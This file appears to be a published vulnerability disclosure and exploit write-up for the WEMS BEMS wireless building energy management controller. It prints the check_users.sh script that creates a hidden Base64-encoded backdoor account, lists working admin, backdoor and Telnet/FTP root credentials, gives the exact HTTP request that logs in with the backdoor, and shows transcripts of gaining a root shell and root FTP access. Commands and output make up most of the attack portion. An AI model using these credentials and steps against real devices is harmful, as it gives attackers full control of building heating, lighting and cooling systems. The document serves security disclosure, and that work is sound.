@@ -1,0 +1,211 @@
+# Exploit: WEMS BEMS 21.3.1 - Undocumented Backdoor Account
+# Date: 2019-12-30
+# Author: LiquidWorm
+# Vendor: WEMS Limited
+# Product web page: https://www.wems.co.uk
+# Advisory ID: ZSL-2019-5552
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5552.php
+
+WEMS BEMS 21.3.1 Undocumented Backdoor Account
+
+
+Vendor: WEMS Limited
+Product web page: https://www.wems.co.uk
+Affected version: Web: 21.3.1
+                  Web: 20.0beta
+                  Web: 19.5
+                  Web: 18.4
+                  Firmware: 1.26.6 (OS: 5.3)
+                  Firmware: 1.23.7 (OS: 5.0)
+                  Firmware: 1.21.4 (OS: 4.1a-usb)
+                  Firmware: 1.18.0.3 (OS: i686-1.1)
+Platform: Shockwave Flash (SWF) / CGI
+
+Summary: We (WEMS) offer the world's first fully wireless energy management system.
+Our solution enables your organization to take control of its energy costs, by monitoring
+lighting, heating and air conditioning equipment to identify wastage across multiple
+sites and start saving money instantly. Additionally, we offer a service which enables
+you to personally control the settings of your building - remotely, via text messaging
+and the internet - from wherever you happen to be in the world.
+
+Desc: The wireless BMS solution has an undocumented backdoor account that is Base64-encoded.
+These sets of credentials are never exposed to the end-user and cannot be changed through
+any normal operation of the controller thru the RMI. Attacker could exploit this vulnerability
+by logging in using the backdoor account with highest privileges for administration and gain
+full system control. The check_users.sh Bash script is used to generate the default accounts
+on the system with their passwords and privilege level. The backdoor user cannot be seen in
+the users settings in the admin panel and it also uses an undocumented privilege level 3 when
+using the addhttpuser program which allows full availability of the features that the WEMS
+is offering remotely. WEMS also ships with hard-coded and weak credentials for Telnet/FTP
+access using the credentials gast:glasshou or root:glasshou.
+
+Tested on: Linux 2.6.16 armv5tejl
+           thttpd/2.25b
+           Adam 7000 System
+           WEMS OS 5.3
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5552
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5552.php
+
+
+06.07.2019
+
+--
+
+
+Excerpt content of check_users.sh bash script:
+----------------------------------------------
+
+# cat /tmp/check_users.sh
+...
+...
+if [ -n "${varSystem}" ];then
+  #add 'V.A.R.' user credentials
+  /mnt/bin/addhttpuser -u var -p 88fRK66Q -l 2 > /dev/null
+  /mnt/bin/addhttpuser -u varuser -p user -l 1 > /dev/null
+  /mnt/bin/addhttpuser -u varview -p view -l 0 > /dev/null
+else
+  #add 'wems' user credentials
+  /mnt/bin/addhttpuser -u wems -p kup5EF4s -l 2 > /dev/null
+  /mnt/bin/addhttpuser -u wemsuser -p user -l 1 > /dev/null
+  /mnt/bin/addhttpuser -u wemsview -p view -l 0 > /dev/null
+fi
+
+echo "Adding logging user credentials..."
+/mnt/bin/addhttpuser -u YWRhbWNvbGxlY3Q -p YzAxMTNjdGFkYW0K -l 3 > /dev/null
+
+# Verify user added successfully...
+if [ "$?" -eq "255" ]
+then
+        echo "Error when adding logging user credentials - aborting.."
+        cp -p /mnt/etc/httpusers.default /mnt/etc/httpusers
+        exit
+fi
+
+veri_user=`grep -e 'YWRhbWNvbGxlY3Q' /mnt/etc/httpusers`
+
+if [ -n "$veri_user" ]
+then
+        echo "User credentials added successfully."
+        cp -p /mnt/etc/httpusers /mnt/etc/httpusers.default
+        exit
+else
+        echo "Error when adding user credentials - restoring defaults."
+        cp -p /mnt/etc/httpusers.default /mnt/etc/httpusers
+fi
+----------------------------------------------
+
+
+Default and hard-coded credentials:
+-----------------------------------
+
+WEMS:
+ 
+ [Level 2/Admin - Web/SWF->CGI]     : wems:kup5EF4s
+ [Level 1/User - Web/SWF->CGI]      : wemsuser:user
+ [Level 0/View - Web/SWF->CGI]      : wemsview:view
+ [Level 3/Backdoor - Web/SWF->CGI]  : YWRhbWNvbGxlY3Q:YzAxMTNjdGFkYW0K (adamcollect:c0113ctadam)
+
+V.A.R. (Value Added Reseller):
+
+ [Level 2/Admin - Web/SWF->CGI]     : var:88fRK66Q
+ [Level 1/User - Web/SWF->CGI]      : varuser:user
+ [Level 0/View - Web/SWF->CGI]      : varview:view
+
+Shell:
+
+ [Level 500/User - Telnet/FTP]      : gast:glasshou
+ [Level 0/root - Telnet/FTP]        : root:glasshou
+-----------------------------------
+
+
+By calling the auth command through the cmd parameter, the cgiauth binary
+reads the /mnt/etc/httpusers file and checks validation for authentication.
+To login with the backdoor account the following HTTP GET request is made:
+--------------------------------------------------------------------------
+
+GET /cgi-bin/cgiauth?user=YWRhbWNvbGxlY3Q&pass=YzAxMTNjdGFkYW0K&cmd=auth HTTP/1.1
+Host: 192.168.1.17
+User-Agent: Noproblem/25.1
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://192.168.1.17/SMARThome1.swf
+
+Response observed:
+
+HTTP/1.1 200 OK
+content-type: text/html
+Transfer-Encoding: chunked
+Date: Fri, 13 Sep 2019 18:15:17 GMT
+Server: WEMS OS 5.0 Casino
+
+sessionid=EQhaZPEXgJQhkXeZ&level=3&username=YWRhbWNvbGxlY3Q
+
+
+--------------------------------------------------------------------------
+
+
+Running addhttpuser, reading httpusers file:
+--------------------------------------------
+
+# /mnt/bin/addhttpuser
+Usage is -u <username> -p <password> -l <level>
+# cat /mnt/etc/httpusers
+0:wems:$1$3EVBJ96F$RBX7xggVT8.zXM9vDbGWB/:2
+1:wemsuser:$1$3EVBJA6F$Gr6zU7L0n4OPq7YdCM5.b1:1
+2:wemsview:$1$3EVBJB6F$6XtYBc2VaQYucRe2T7lfa.:0
+3:YWRhbWNvbGxlY3Q:$1$3EVBJD6F$scO5furQud3eKLHpNyUyo.:3
+# ls -al /mnt/bin/addhttpuser
+-rwxr-xr-x    1 root     root        16520 Jan 29  2014 /mnt/bin/addhttpuser
+--------------------------------------------
+
+
+Root shell:
+-----------
+
+$ telnet 192.168.1.17
+Connected to 192.168.1.17.
+Escape character is '^]'.
+
+- Adam 7000 System - Version 4.1a-usb -
+
+WEMS login: gast
+Password: 
+
+
+BusyBox v1.01 (2011.02.24-11:55+0000) Built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+$ id
+uid=500(gast) gid=500
+$ su
+Password: 
+
+
+BusyBox v1.01 (2011.02.24-11:55+0000) Built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+# id
+uid=0(root) gid=0(root)
+# netstat -nat
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN
+-----------
+
+
+$ ftp 192.168.1.17
+WEMS FTP server (Version wu-2.6.2(12) Thu Feb 24 14:48:47 GMT 2011) ready.
+user root
+331 Password required for root.
+pass glasshou
+230 User root logged in.
